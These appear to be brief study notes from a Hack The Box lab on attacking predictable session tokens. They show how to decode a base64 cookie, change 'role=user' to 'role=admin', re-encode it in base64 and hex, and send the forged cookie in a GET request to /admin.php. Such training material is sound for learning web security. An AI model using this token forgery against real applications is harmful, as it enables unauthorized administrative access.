## Attacking Predictable Session Tokens
- Encode in base64 or hex


**Base64-encoded
```
echo -n dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy | base64 -d

user=htb-stdnt;role=user
```
```
echo -n 'user=htb-stdnt;role=admin' | base64

dXNlcj1odGItc3RkbnQ7cm9sZT1hZG1pbg==
```


**Hex encoded
```
echo -n 'user=htb-stdnt;role=admin' | xxd -p

757365723d6874622d7374646e743b726f6c653d61646d696e
```


**Gain access
```
GET /admin.php HTTP/1.1
Host: IP
Cookie: session=dXNlcj1odGItc3RkbnQ7cm9sZT1hZG1pbg%3d%3d
```
